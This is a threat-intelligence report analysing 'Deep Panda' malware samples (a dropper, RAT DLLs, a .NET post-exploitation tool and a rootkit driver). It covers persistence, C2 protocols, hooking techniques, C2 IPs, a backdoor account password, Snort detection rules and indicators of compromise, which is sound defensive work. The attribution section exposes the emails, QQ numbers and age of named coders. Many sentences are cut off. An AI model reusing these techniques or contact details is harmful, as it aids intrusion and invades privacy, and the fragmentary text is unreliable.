DEEP PANDA
INTELLIGENCE TEAM REPORT VER . 1.0
DEEP PANDA
11    EXECUTIVE SUMMARY                                                                        2
12    TECHNICAL ANALYSIS                                                                      3
Dropper Sample ( MD5 : 14c04f88dc97aef3e9b516ef208a2bf5 )                                 3
Backdoor DLL Sample ( MD5 : 47619fca20895abc83807321cbb80a3d )                            5
Initial C2 Phone Home Beacon                                                      6
Network Protocol and Implementation                                               7
Backdoor Functionality , Supported Commands                                        7
Post Exploitation Tool Sample ( MD5 : 2dce7fc3f52a692d8a84a0c182519133 )                  8
Network Protocol and Implementation                                               9
Backdoor DLL Sample ( MD5 : de7500fc1065a081180841f32f06a537 )                           10
C2 Communication Mechanisms                                                      12
C2 Command Invocation                                                            13
Kernel Driver Sample ( MD5 : dae6b9b3b8e39b08b10a51a6457444d8 )                          14
Entrypoint                                                                       14
13    MITIGATION / REMEDIATION                                                                18
Network Signatures                                                                    18
File System Artifacts                                                                 19
Registry Artifacts                                                                    19
Other Artifacts                                                                       19
14    ATTRIBUTION                                                                             20
15    CONCLUSION                                                                              25
Dropper / Implant # 1                                                                      25
Post Exploitation Tool                                                                  25
Implant # 2                                                                              26
Backdoor DLL                                                                            26
System Driver                                                                           26
16    APPENDIX                                                                                27
Appendix A : Command Line Options for Post Exploitation Tool Sample                      27
Appendix B : Algorithm for computing machine ID                                          28
Appendix C : Remote Commands Supported by .NET Backdoor Post Exploitation Tool Sample    28
Appendix D : Raw bytes of example Authentication packet .                                 30
Appendix E : Initialization of KEY and IV for AES                                        30
Appendix F : Command & Control Servers                                                   31
Appendix G : Edward Sun ’s kernel network hook code                                       32
Appendix H : Command and Control MD5 Correlation                                         41
DEEP PANDA
EXECUTIVE SUMMARY
The samples were clearly malicious and varied in sophistication . All three samples provided remote access
to the attacker , via two Command and Control ( C2 ) servers . One sample is typical of what is commonly
referred to as a ‘ dropper’ because its primary purpose is to write a malicious component to disk and connect
it to the targeted hosts operating system . The malicious component in this case is what is commonly re-
ferred to as a Remote Access Tool ( RAT ) , this RAT is manifested as a Dynamic Link Library ( DLL ) installed
as a service . The second sample analyzed is a dual use tool that can function both as a post exploitation
tool used to infect other systems , download additional tools , remove log data , and itself be used as a
backdoor . The third sample was a sophisticated implant that in addition to having multiple communication
capabilities , and the ability to act as a relay for other infected hosts , utilized a kernel mode driver that can
hide aspects of the tool from user - mode tools . This third component is likely used for long - term
implantation and intelligence gathering . Some AV engines occasionally identify this sample as Derusbi
Trojan . CrowdStrike Intelligence Team has seen Trojans from 8 different builder variants of this RAT ,
including 64-bit versions , used in targeted attacks in 2011 against Defense , Energy / Power , and Chemical
Industries in US and Japan .
target various strategic interests of the United States including High Tech / Heavy Industry ,
Non - Governmental Organizations ( NGOs ) , State / Federal Government , Defense Industrial Base ( DIB ) , and
organizations with vast economic interests . This report contains an in - depth technical analysis of the
samples , detection / remediation / mitigation information , attribution intelligence , and a conclusion aimed at
providing the reader with a synopsis of the report .
CROWDSTRIKE                                                                           S E N S I T I VE           2
DEEP PANDA
TECHNICAL ANALYSIS
Dropper Sample ( MD5 : 14c04f88dc97aef3e9b516ef208a2bf5 )
The executable 14c04f88dc97aef3e9b516ef208a2bf5 is commonly referred to as a ‘ dropper’ , which is
designed with the purpose of extracting from itself a malicious payload and to initialize and install it into a
targeted system . In this case , the malicious payload is a Dynamic - Link Library ( DLL ) , which enables an
attacker to have full control of the system . This code appears to have been compiled on Wednesday May
4th , 2011 at 11:04:24 A.M. UTC ( equivalent to early evening time in China ) . Note that the timestamp is in
resolves several library functions provided by Microsoft using the LoadLibrary ( ) and GetProcAddress ( )
Application Programming Interfaces ( APIs ) . The imported function names are not encrypted ; however , the
function name is minutely obfuscated by a simple single character substitution :
//Obfuscation of GetTempPathA ( ) API function call
strcpy((char * ) ProcName , “ 2etTempPathA ” ) ;
ProcName[0 ] = ‘ G’ ;
The dropper invokes the SHGetSpecialFolderPath ( ) API supplying a Constant Special Item ID List ( CSIDL )
of ‘ CSIDL_COMMON_DOCUMENTS’ to identify the destination folder for the malicious DLL payload . The
users . A typical path is C:\Documents and Settings\All Users\Documents . ”
available name in this set :
1 .       infoadmn.dll
2 .       infoctrs.dll
3 .       infocardapi.dll
artifact which indicates the language setting on the compiler used by the person who built the binary was
CROWDSTRIKE                                                                            S E N S I T I VE             3
DEEP PANDA
code version . Since the dropped resource is not compressed , the routine fails . This indicates a low
parameter . This export then implements the actual install logic to maintain persistence and invoke the main
routine .
The dropper binary contains an icon resource that resembles the ‘ Google Chrome’ browser icon , the re-
systems language set to Chinese . The use of the Chrome icon may indicate a possible attempt to socially
CROWDSTRIKE                                                                        S E N S I T I VE             4
DEEP PANDA
Backdoor DLL Sample ( MD5 : 47619fca20895abc83807321cbb80a3d )
14c04f88dc97aef3e9b516ef208a2bf5 . This code appears to have been compiled on Wednesday May 4th ,
2011 at 10:48:19 A.M. UTC ( equivalent to early evening time in China ) . It is instantiated when it is mapped
service despite the appearance . If the service is present , the malware replaces its previous instances or
versions of this backdoor . After attempting to disable the existing service , the malware tries to install itself as
a service with that same name . During installation , the sample attempts to use documented APIs such as
OpenSCManager ( ) and CreateService ( ) to initialize itself as a persistent Windows service . As a
precaution , the sample writes settings directly to the Windows Registry to accomplish the same goal if
installing the service with the documented APIs fails . The registry change creates the following key :
HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\msupdate\\Parameters
Following this , the subroutine will set the value of the ‘ ServiceDLL’ to the module handle of the DLL .
The next key to be changed is :
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost , which will have
the ‘ msupdate’ key set to ‘ msupdate’.
The export ‘ CollectW3PerfData’ is registered as the main function of the DLL . If the installation of the new
service is successful , the sample then starts the new service and exits . If the installation fails , the sample
exported function . In the case of installation failure , rundll32.exe calls the main functions export
over the machine , as rundll32.exe is frequently launched by tasks such as changing the time , wallpaper ,
or other system settings . This means that after cleaning up the components dropped by the malware , the
system remains vulnerable to local attacks by simply overwriting the legitimate rundll32.exe executable with
a malicious version and await it ’s automatic execution by the Operating System .
Window with class “ NOD32_%d ” where % d is replaced with a pseudo - random number . This may be an
attempt to fool some automated dynamic analysis or anti - malware software into believing this is the
After creating this window , the routine starts the main thread that eventually initiates calling out to the
Command and Control ( C2 ) . In order to accomplish this task , the newly
CROWDSTRIKE                                                                             S E N S I T I VE            5
DEEP PANDA
created thread initializes networking APIs using WSAStartup ( ) and resolves some other APIs dynamically
using LoadLibrary ( ) and GetProcAddress ( ) . Once the proper API ’s have been resolved , the sample then
assigns a NULL SID to the rundll32.exe executable and sets the current process’ Window Station to
“ winsta0 ” , which enables the sample to access the real user ’s desktop if started as service .
The communication to the C2 is handled by a while ( ) loop , with each successive connection attempt
causing the loop to invoke the Windows Sleep ( ) API for a time interval of 2 seconds , exponentially
increasing in length up to 1024 seconds ( 17 minutes ) and then restarting back to 2 seconds .
Initial C2 Phone Home Beacon
in the binary , using the User - Agent string “ Google ” , this code is not activated due to the format of the stat-
a raw socket to the C2 located at 1.9.5.38:443 . This indicates the use of a ‘ boiler plate code’ or a builder
software package that automates the creation of the malicious sample .
The malicious sample sends an initial beacon to the C2 that includes the following information :
Desktop session or “ none ” otherwise .
The following python function can be used to decode the beacon stings :
def decode(crypted ) :
decoded= ” ”
for x in crypted :
decoded+=chr(((ord(x)^(0x1C + 1 ) ) + ( 0x1C + 1 ) ) & 0xFF )
return decoded
CROWDSTRIKE                                                                           S E N S I T I VE             6
DEEP PANDA
After sending the initial beacon , the routine loops receiving incoming commands and executes them in
sequence . When a connection can successfully be established to the C2 server , the sleep timer is reset to
two seconds for the next attempt .
Network Protocol and Implementation
The network protocol used by this sample resembles a ‘ Type - Length - Value’ layout in both directions .
Each 16 byte request header consists of :
2 . A 4-byte little - endian payload length
3 . 8 bytes remaining are a request header that is typically uninitialized and only used by some
commands instead of the arbitrary length payload
buffer of 408 bytes size . Providing additional payload of any larger size will result in a trivial exploitable stack
exploitation of this vulnerability is unnecessary due to the already available unauthenticated command
execution capabilities of this backdoor .
Certain commands initiate a second connection to the C2 in a separate thread using the same network
Backdoor Functionality , Supported Commands
The primary aim of this backdoor is remote desktop control functionality comparable to VNC or Remote
Desktop over a custom protocol . It allows the adversary to view the main desktop graphically and
control the keyboard and mouse . This remote control functionality is implemented as separate messages
0x22000001 initiates continuous transmission of screen captures to the C2 . The screen captures are
created using a series of Microsoft Windows Graphic Device Interface ( GDI ) API calls culminating in a call to
GetDIBits ( ) .
Command 0x20000001 exits the backdoor and 0x20000000 is issued to completely remove the backdoor
from the system .
CROWDSTRIKE                                                                              S E N S I T I VE            7
DEEP PANDA
When command 0x23000004 is received , a temporary new user “ _ DomainUser _ ” with password “ Dom4!nU-
serP4ss ” is created and added to the local Administrators group . The backdoor is then started under that
account and the user is deleted . It would appear this technique is meant to obfuscate the activities of the
malicious sample by masking the process creator ’s user name to appear to be a generic domain user . Note
that such an account does not normally exist in an Active Directory environment .
Additionally , the primary C2 connection allows for requests to start additional connections to the C2 imple-
menting the following functionality :
killing of running processes
output of arbitrary executables ; initiated by command 0x23000000
Post Exploitation Tool Sample ( MD5 : 2dce7fc3f52a692d8a84a0c182519133 )
This sample is typical of a post exploitation tool ; it is written in .NET 2.0 . This code appears to have been
compiled on Thursday May 26th , 2011 at 10:21:44 A.M. UTC ( early evening time in China ) . The backdoor
functionality can be instantiated either directly from the command line or through commands issued over a
network based protocol via the C2 . If no arguments are given , a connection to the C2 is initiated to the stati-
C2 .
line arguments can be viewed in Appendix A. This activity is generally associated with log cleaning to com-
plicate a forensic investigation .
The sample contains an embedded IP address for C2 that is stored in an encrypted format as a string re-
source :
CROWDSTRIKE                                                                          S E N S I T I VE            8
DEEP PANDA
202.86.190.3:80 ( Hong Kong : TeleOne(HK ) Limited ) .
Network Protocol and Implementation
There are three components to the protocol :
Authentication is accomplished using a 32 byte packet , this packet consists of :
2 . A four byte random number generated by the rand ( ) function
3 . The machine ID comprised of an obfuscated combination of the Machine name and hard drive
serial number . The algorithm for generating this is in Appendix B
4 . The communication protocol version number , which in this sample is 0x2
5 . The version of the malicious sample , in this case it is 841
An example authentication packet sent to the C2 is located in Appendix E
to the client which is then RC4 encrypted using the random number generated in step 2 from above as the
password . This value is then transformed using a simple algorithm in Appendix F into a 32 byte array . The
up AES encryption which is then used to encrypt and decrypt any further communications .
CROWDSTRIKE                                                                        S E N S I T I VE           9
DEEP PANDA
Beacon , this is typical of this type of malicious sample , it allows the operator to separate various infected
hosts in a targeted campaign . The beacon for this sample is formatted as XML and consists of :
An example of an unencrypted beacon :
< ? xml version=”1.0 ” encoding=”utf-16 ” ? >
< BasicInfo xmlns : xsi=”http://www.w3.org/2001/XMLSchema - instance ” xmlns : xsd=”http://www .
w3.org/2001/XMLSchema ” >
< HostName > Infected System Hostname</HostName >
< int_0>-8</int_0 >
< osVersion > Microsoft Windows NT 6.1.7601 Service Pack 1</osVersion >
< string_0>12/27/2011 16:34:36</string_0 >
< Version>2</Version >
< /BasicInfo >
Command handling loop , this is a loop structure that will process and execute commands sent by the C2 .
The malware sends and receives a heartbeat / keepalive packet every 2 minutes . The command format is
derived from a structure consisting of :
description of the possible values for commands is in Appendix D. It is important to note that the order in
calling methods on those assemblies , connecting to new C2 servers and executing processes .
Backdoor DLL Sample ( MD5 : de7500fc1065a081180841f32f06a537 )
Backdoor DLL Sample ( MD5 : de7500fc1065a081180841f32f06a537 )
This sample is a sophisticated backdoor which implements several communications protocols and was
UTC ( late evening time in China ) . The code contains several Run Time Type Information ( RTTI ) artifacts that
CROWDSTRIKE                                                                           S E N S I T I VE            10
DEEP PANDA
Variants of this Trojan are sometimes detected under the name ‘ Derusbi’ by Microsoft , Trend , Sophos and
Symantec AV engines .
This sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide
an interactive command line shell to the C2 . It also is able to bypass User Account Control ( UAC ) to install
itself by using the ‘ sysprep.exe’ Microsoft Windows executable provided by the targeted system . The steps it
takes to install itself onto a system are as follows :
1 . Copies itself to to % WINDIR%\system32\Msres<3 random characters>.ttf
the current system time when the copy was made but with the year changed to 2005 .
MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<service > ” This defaults to “ wuauserv ” ,
4 . Adds itself to list of services started by ‘ netsvc’ using the service name ‘ helpsvc’.
5 . If McAfee AV is installed , creates a copy of regsvr32.exe named Update.exe and then schedules
the copy to be deleted on reboot using the well documented MoveFileExA API .
6 . It then calls either the original or copy of regsvr32.exe with the parameters /s /u and the path to
the copy of itself it made in Step 1 . The /u parameter means “ uninstall ” , which calls
DllUnregisterServer , this is an unsophisticated method of DLL entry point obfuscation .
7 . DllUnregisterServer installs the driver and initiates the backdoor component .
exe ” is running ( AntiVirus360 program from the Chinese ‘ Quihoo 360 Technology Co. , LTD’ 360               ) ,
or the username of the DLL ’s host process context is not ‘ SYSTEM’ , the driver is not written to disk . Barring
the two aforementioned conditions , the sample decrypts the kernel driver to :
“ % sysdir%\Drivers\{6AB5E732-DFA9 - 4618-AF1C - F0D9DEF0E222}.sys ”
-
hash of dae6b9b3b8e39b08b10a51a6457444d8 .
“ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\Security ”
code .
CROWDSTRIKE                                                                          S E N S I T I VE              11
DEEP PANDA
the backdoor then loads the original service ’s DLL into the address space with LoadLibrary and invokes the
ServiceMain export . This effectively hijacks the original service ’s entry while retaining its functionality .
While there is code in the binary that allows downloading a list of C2 servers from an HTTP URL , the default
the one used by the post exploitation .NET tool .
C2 Communication Mechanisms
The malware has three distinct C2 protocols two of which can be transmitted over HTTP proxies and one
can be bundled in two different ‘ dual’ modes ( see 3 . ) , totaling 7 distinct supported C2 mechanisms . The con-
1 . Proprietary binary header ( optionally over an HTTP Proxy using CONNECT mechanism ) ; this
protocol consists of 64 random bytes being sent to the C2 . The C2 then responds with 64 bytes
bytes rotated right by seven bits and compares that value to the seven bits rotated right version of
the server ’s response , effectively neutralizing the rotation ’s effect ; the purpose of this is unclear .
request string including HTTP headers ( optionally over a HTTP Proxy using CONNECT ) . The
malware requires the response to start with “ HTTP/1.0 200 ” or “ HTTP/1.1 200 ” and an absence of
a “ Connection : close ” header . This one HTTP connection will be used for bi - directional
communications , sending chunks of POST payload and receiving chunks of the response ,
interleaved .
3 . Two long - running HTTP requests to the same C2 ( optionally over an HTTP Proxy with original
request verb ) , one GET request to “ /Photos / Query.cgi?loginid= ” followed by a random number
and one POST request to “ /Catelog / login1.cgi ” . The GET request serves as a down - stream
channel while the POST request serves as a upstream channel .
legitimate appearing channels as required in order to appear Request For Comment ( RFC ) compliant with
the HTTP protocol .
CROWDSTRIKE                                                                          S E N S I T I VE            12
DEEP PANDA
due to time constraints .
After establishing any of the aforementioned channels for arbitrary binary data exchange , the malware will
start sending and receiving compressed binary blobs via the channel of choice . The C2 ’s binary data blobs
are compressed . No further encryption of the data takes place .
All C2 transport implementations contain code for accepting and handling server - side connections of the
respective protocols . However , this code does not appear to be invoked . It appears that the author of this
code shares the library that implements these transports for the client with the C2 server .
C2 Command Invocation
The main backdoor thread then reads commands from the chosen C2 protocol and passes them on to any
of the following registered handler classes based upon a command ID . The handler class is responsible for
parsing the remainder of the command .
PCC_PROXY : TCP Proxy
This handler class implements a generic TCP proxy . It supports establishing TCP connections to other hosts
and also listening for incoming connections . The incoming connection contents are forwarded to the C2 and
data from the C2 is passed on to connections . It supports up to 1024 parallel connections .
PCC_MISC : Gather and report system information
The malware is capable of gathering various pieces of information from the system , triggered by a command
ID 10 . The capabilities include recovering authentication credentials from various system and client storage
such as Mozilla Firefox , Internet Explorer , and Remote Access Service ( RAS ) . This class also supports
gathering intelligence on the infected system including identifying security tools by their process name , proxy
accounts , and version numbers for the Operating System ( OS ) and Internet Explorer .
PCC_SYS : System Management
This handler class provides the attacker with the ability to manage system components including start / stop/
delete system services , enumerate / alter registry keys , and manage running processes . This class also
provides the ability for the attacker to take a screen shot of the users desktop .
INTERNAL_CMD : Command - Line Shell
CROWDSTRIKE                                                                          S E N S I T I VE           13
DEEP PANDA
This handler class uses the command ID 5 and implements an interactive command line shell accessible
from the C2 server , containing a series of built - in commands . If the input is not in this list of built - in
commands , the malware attempts to invoke cmd.exe in the background , launching a command or command
line utility already present on the system . The standard output channel of that command is provided back to
the C2 . The supported built - in commands are :
Kill Switch / Self - Destruction
The only command that is implemented directly in the main backdoor thread as a subprocedure call and not
via a generic command handler class is command ID 256 . This command results in the DLL deleting itself
and terminating the backdoor process .
Kernel Driver Sample ( MD5 : dae6b9b3b8e39b08b10a51a6457444d8 )
This sample is a packed 32-bit kernel driver extracted by the aforementioned DLL with an MD5 hash of :
de7500fc1065a081180841f32f06a537 , this sample will only function on a Windows 32-bit kernel . This code
appears to have been compiled on Sunday October 9 , 2011 at 4:50:31 P.M. UTC ( very early morning time
of Monday , October 10 in China ) .
Entrypoint
This section describes how the driver performs its initialization routine .
Multiple Instance Protection
The driver begins by opening a named event in the BaseNamedObjects object directory with the name
exists , the driver fails to load , presumably to avoid a
CROWDSTRIKE                                                                       S E N S I T I VE          14
DEEP PANDA
multiple instances of itself . If the event does not exist , the driver then creates it using the Windows API
and indicative of relatively limited Windows API knowledge of the author of that part of the code . It is
interesting to note that some of the hex digits in the object name are mixed case which is potentially
indicative of the code being re - appropriated from another source .
Anti - Debugging Protection
The second component of the entry point performs an anti - debugging technique , calling the function
KdDisableDebugger ( ) , which allows the driver to disable usage of the built - in Windows kernel debugging
facility that is used by popular kernel debuggers KD and WinDbg . Tools such as Syser Debugger , or
debugging through a virtual machine are unaffected by this technique . The sample , rather than importing the
KdDisableDebugger ( ) API using conventional methods , looks up the API through
MmGetSystemRoutineAddress ( ) instead . All of the other APIs used by the driver are imported normally , so
this is not a technique to hide import APIs used throughout the driver . Searching Google for
“ MmGetSystemRoutineAddress ” and “ KdDisableDebugger ” results in dozens of Chinese language blogs
which explain how to use this technique to “ Disable WinDbg ” .
Hooking
is designed to hook the system call table , while the other hooks the network stack .
Network Stack Hooking
the version is necessary because Windows versions beginning with Vista utilize a redesigned TCP / IP net-
work stack , most hooking operations will require a different implementation for these versions . On versions
prior to Windows Vista , the TCP / IP driver creates a \Device\Tcp device object through which most network
requests are piped through . On Vista and later , TCP / IP has been split up into multiple components , and IP
connection enumeration , which this driver is targeting , is managed by \Device\nsiproxy instead .
In either case , the driver obtains the device object by using IoGetDeviceObjectPointer ( ) and hooks Major
Function 14 the IRP_MJ_DEVICE_CONTROL , as this is the function through which all Input Output
ConTroLls ( IOCTLs ) are sent , such as the IOCTL for querying active IP connections .
Network Store Interface ( NSI ) Hook
The NSI hook , targets IOCTL 0x12001B , which is used by NsiGetObjectAllParameters ( ) in nsi.dll when
users typically run commands such as netstat.exe or use any of the IP Helper APIs in iphlpapi.dll . The
purpose of the hook is to scan the list of active connections returned to the user , and hide any such
connection currently bound to a local TCP port in
CROWDSTRIKE                                                                            S E N S I T I VE         15
DEEP PANDA
the range between 40000 and 45000 . The hooking is performed by creating a new completion routine
associated with any IRP_MJ_DEVICE_CONTROL IRP that matches the IOCTL , attaching to the target
process , performing several memory copies to hide the entry , and detaching .
This functionality is nearly identical to the code posted by Edward Sun ( aka cardmagic , sunmy1@sina.com ,
onlyonejazz@hotmail.com , cardcian@mail.ustc.edu.cn , QQ # 28025945 ) from Hefei , Anhui province
( Nanjing Military District ) on July 8 , 2007 , then a China - based researcher at Trend Micro ( now working at
at
http://forum.eviloctal.com/viewthread.php?action=printable&tid=29604 ( See Appendix G ) . CrowdStrike has
no information connecting Mr. Sun to this intrusion activity , his code appears to have been appropriated by
the actor to add similar functionality to their code .
TCP Hook
The TCP hook works almost identically to the NSI hook , though instead hooking IOCTL 0x120003 ( IOCTL _
any connections listening on TCP ports in the range between 40000 and 45000 .
System Call Hooking
DWORD at each of these exported functions . Because the system call stub uses the EAX register as an
index for the system call ID , and a “ mov eax , imm32 ” instruction ” instruction is used , this second DWORD
will match the system call ID . It then adds this index to the value of KeServiceDescriptorTable . Base , which
is the exported kernel variable ( on 32-bit Windows only ) which directly points to the system call table . This is
one of the simplest ways to do a system call hook , but will not work on 64-bit Windows as this variable is not
exported in addition to the protection provided by Microsoft PatchGuard .
Windows API IoAllocateMdl ( ) , and associating the MDL to a non - paged buffer using
MmBuildMdlForNonPagedPool ( ) . Once the MDL is associated to the non - paged buffer , the sample locks the
underlying pages using the Windows API MmProbeAndLockPages ( ) . Instead of hooking the entry in the
table directly , which is easily detectable , the driver uses the LDASM open - source disassembly engine to
analyze the function that is being pointed to by the table , and applying a Detours - style hook directly in the
code . It uses the standard “ mov cr0 , eax ” technique , turning off the Write Protect ( WP ) bit as it does this .
When the hook is installed , it writes a special DWORD value , ‘ KDTR’ , which allows it to prevent
double - hooking or badly - hooking the system call , during unhooking , this value is also checked .
Registry Hooks
\\REGISTRY\\MACHINE\\SYSTEM is blocked . RegSaveKey ( ) which is
backup of a particular registry key .
CROWDSTRIKE                                                                          S E N S I T I VE           16
DEEP PANDA
\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\. It then checks for the values of the
“ ServiceDll ” and “ Security ” keys , in the latter case it applies an XOR on the data with the value 127 . The
user - mode component of this malware is a service called “ msupdate ” , this driver is attempting to hide the
key , due to the fact that these APIs provide almost identical functionality when it comes to reading registry
values .
In the registry hooking code of the driver , a call is made to ObReferenceObjectByHandle ( ) . This allows the
driver to receive the ‘ CM_KEY_OBJECT’ which is then used with ObQueryNameString ( ) to get the key / value
path . However , no call to ObDereferenceObject ( ) is ever made , which means that all registry objects being
sent to these APIs are eventually leaked .
In the registry hook , it was noticed that “ CurrentControlSet001 ” was used as the target , if the target machine
function as intended . This is the reason the Microsoft implemented a symbolic link to \\CurrentControlSet
CROWDSTRIKE                                                                          S E N S I T I VE             17
DEEP PANDA
MITIGATION / REMEDIATION
Network Signatures
The following network signatures are designed for the popular Open Source IDS called Snort .
These signature can be ported to other formats upon request .
Malware # 1
alert tcp any any < > any any ( msg : “ BackDoor Beacon Attempt ” ; content:”|78 7c
71 4c 4a 49 49 49 4A 4C 46| ” ; classtype : backdoor ; sid:123456 ; rev:27122011 ; )
alert tcp any any < > any any ( msg : “ BackDoor Beacon Attempt ” ; content:”Goo-
gle ” ; http_uri ; classtype : backdoor ; sid:123457 ; rev:27122011 ; )
alert ip 1.9.5.38 any < > any any ( msg : “ Malicious Host Detected ” ; class-
type : backdoor ; sid:123460 ; rev:27122011 ; )
Malware # 2
alert tcp any any < > any any ( msg:”BackDoor Beacon Attempt ” ; content:”|03 01
74 80 82 21 b5 64 c2 74 22 e3 02 00 00 00 49 03 00 00 00 00 00 00 00 00 00 00
0000 00 00| ” ; classtype : backdoor ; sid:123458 ; rev:27122011 ; )
alert ip 202.86.190.3 any < > any any ( msg:”Malicious Host Detected ” ; class-
type : backdoor ; sid:123459 ; rev:27122011 ; )
Malware # 3
alert tcp any any < > any any ( msg : “ BackDoor C2 ” ; content : “ POST /forum/
login.cgi HTTP/1.1 ” ; content:”User - Agent : Mozilla/4.0 ” ; classtype : backdoor ;
sid:123461 ; rev:27122011 ; )
alert tcp any any < > any any ( msg : “ BackDoor C2 ” ; content : “ GET /Photos / Query .
cgi?loginid= ” ; classtype : backdoor ; sid:123462 ; rev:27122011 ; )
alert tcp any any < > any any ( msg : “ BackDoor C2 ” ; content : “ POST /Catelog/
login1.cgi HTTP/1.1 ” ; content:”User - Agent : Mozilla/4.0 ” ; classtype : backdoor ;
sid:123461 ; rev:27122011 ; )
CROWDSTRIKE                                                                    S E N S I T I VE    18
DEEP PANDA
File System Artifacts
Dropper / DLL
C:\Documents and Settings\All Users\Documents\infoadmn.dll ( TS : 2007 - 03 - 07 00:00:00 )
C:\Documents and Settings\All Users\Documents\infoctrs.dll ( TS : 2007 - 03 - 07 00:00:00 )
C:\Documents and Settings\All Users\Documents\infocardapi.dll ( TS : 2007 - 03 - 07 00:00:00 )
MD5 : 47619fca20895abc83807321cbb80a3d
Post Explotiation Tool
MD5 : 2dce7fc3f52a692d8a84a0c182519133
Backdoor
MD5 : de7500fc1065a081180841f32f06a537
Kernel Driver :
MD5 : dae6b9b3b8e39b08b10a51a6457444d8
“ % sysdir%\Drivers\{6AB5E732-DFA9 - 4618-AF1C - F0D9DEF0E222}.sys ”
Registry Artifacts
The following Windows Registry artifacts are indicative of a compromised host :
Dropper / DLL
HKLM\\SYSTEM\\CurrentControlSet\\Services\\msupdate
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost which will have
the ‘ msupdate’ key set to ‘ msupdate’
Backdoor
HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Msres<3 character rand>.ttf
Other Artifacts
Dropper / DLL
Username : _ DomainUser _ Password:”Dom4!nUserP4ss ”
Backdoor
The backdoor may be detected by several different Anti - Virus products under a signature with the name :
Derusbi
Kernel Driver
Object : { 8CB2ff21 - 0166 - 4cf1-BD8F - E190BC7902DC }
CROWDSTRIKE                                                                       S E N S I T I VE         19
DEEP PANDA
ATTRIBUTION
Attribution in the cyber domain is always a tricky subject when relying solely on malicious samples .
Compiler artifacts and language settings can of course be deliberately masked or spoofed . CrowdStrike
uses a unique approach of comprehensive threat analysis in order to decipher attributable components .
Based on the corroborating evidence discovered in the course of this analysis , it appears there are
numerous indications that this is a Chinese - speaking actor .
, a Chinese security product available from
http://www.360.cn/. This is particularly relevant in this case because the backdoor DLL sample with an MD5
this tool . Speculatively this may be because this security product detects this rootkit , or the author was
attempting to prevent accidental infection on systems running this Anti - Virus product .
The obfuscation of the KdDisableDebugger ( ) function call is seen on several Chinese language forums ,
and can be seen being reused in several code samples on those forums . As previously mentioned there is
no advantage associated with using this call obfuscation , and appears to be reused for no apparent reason
other than the attackers have copied code directly from forum code .
While the various network hooking techniques used in the kernel driver may appear novel or well
‘ rootkit.com’ by a Chinese language developer . This post is currently mirrored on dozens of Chinese hacking
websites .
Similarly the system call hooking is less impressive after searching for “ IoAllocateMdl ” and “ cr0 ” ( bbs.pediy .
com / showthread.php?t=77467
perform system call hooking through MDLs . The ldasm inline hooking is also repeated in numerous postings
to Chinese forums . One particular website ( http://read.pudn.com / downloads197/sourcecode / windows / sys-
tem/927802/CCRootkit / RootkitSys / HookSSDT.c__.htm ) had an almost identical ldasm loop that tried to
identify the exact same code sequences . Open source research of the 4 innocuous kernel APIs
Chinese website that has a cached rootkit performing similar hooks on the same 3 registry related APIs .
While the driver does not use pool tags for most of its allocations , it does utilize them in the networking
hooking code , much like the examples found on the Chinese language forums . This sample uses pool tags :
‘ tnet,’ and ‘ KDTR’. Although the meaning of the KDTR tag is not
1 http://bbs.pediy.com/showthread.php?t=125358
http://kost0911.pixnet.net/blog/post/36914183-anti-anti-windbg
CROWDSTRIKE                                                                         S E N S I T I VE          20
DEEP PANDA
coincides with the matching functionality of the detour - style inline hook .
The driver code ( MD5 : dae6b9b3b8e39b08b10a51a6457444d8 ) appears to be a combination of various
code that is easily searchable on the Internet , and almost always attributed to Chinese language forums
and websites . The system call hooking parts of the code appear to be identical to the HookSSDT.c code
authored by Steven Lai ‘ embedlinux’ and utilized in what the author titled ‘ CC Rootkit’ on on August 4 , 2008
who ’s email address is hqulyc@126.com . This user has a QQ identity of : 5054 - 3533 , QQ is a popular
( http://user.qzone.qq.com/50543533 ) appears to be Steven Lai . He was is 28 years old ( born September 5 ,
at Xiamen XOCECO New Technic Co. , Ltd. ( http://www.likego.com/en/about.asp ) , a company that builds
however was used by whomever built the kernel driver utilized by the backdoor and for this reason we are
providing the background on this individual .
CROWDSTRIKE                                                                       S E N S I T I VE          21
DEEP PANDA
ATTRIBUTION
For more information about Intelligence - as - a - Service or
specific attribution information on Deep Panda , contact
the CrowdStrike Global Intelligence Team
CROWDSTRIKE                                                        S E N S I T I VE    22
DEEP PANDA
ATTRIBUTION
For more information about Intelligence - as - a - Service or
specific attribution information on Deep Panda , contact
the CrowdStrike Global Intelligence Team
CROWDSTRIKE                                                              S E N S I T I VE    23
DEEP PANDA
ATTRIBUTION
For more information about Intelligence - as - a - Service or
specific attribution information on Deep Panda , contact
the CrowdStrike Global Intelligence Team
( http://read.pudn.com / downloads197/sourcecode / windows / system/927802/CCRootkit / RootkitSys / HookSS-
DT.c__.htm ) .
According to this Linux driver development guide ‘ embedlinux’ published on July 31 , 2008 ( http://wenku .
baidu.com/view/e24205294b73f242336c5f45.html ) , t
CROWDSTRIKE                                                                      S E N S I T I VE          24
DEEP PANDA
CONCLUSION
The samples involved in this incident are typical of attacks commonly associated with the People ’s
Republic of China ( PRC ) . These code samples have a variety of Tools , Techniques , and Procedures ( TTPs )
The ability to conduct Incident Response ( IR ) including forensics , and log analysis , greatly augments this
visibility into these aspects of the incident . Some indications as to the adversaries’ capabilities can be
derived from the captured samples alone .
Dropper / Implant # 1
The dropper code ( MD5 : 14c04f88dc97aef3e9b516ef208a2bf5 ) does not utilize any techniques that are
unique or unusual , and is consistent with tools , techniques , and procedures of attacks targeting proprietary
information and generally attributed to the PRC . The presence of dead code and its replacement by a more
side . The ‘ dead code’ utilizes a more sophisticated compression algorithm provided by a third party which
was rendered useless for some reason . This may have been a result of the attacker modifying an existing
tool , or unknowingly using a re - purposed tool . The dropper resources indicate the compiler used to build the
tool was running on a system that utilized the Chinese “ Simple ” language pack and was built on Wednesday
May 4th , 2011 at 11:04:24 A.M. UTC ( early evening time in China ) . While this can be deliberately spoofed
speaking actor .
The dropped DLL ( MD5 : 47619fca20895abc83807321cbb80a3d ) itself contains functionality that is typical
-
encryption / obfuscation using a statically compiled XOR key . The sample uses TCP port 443 for commu-
nication , but makes no attempt to mimic the SSL protocol typically used on that port number , which would
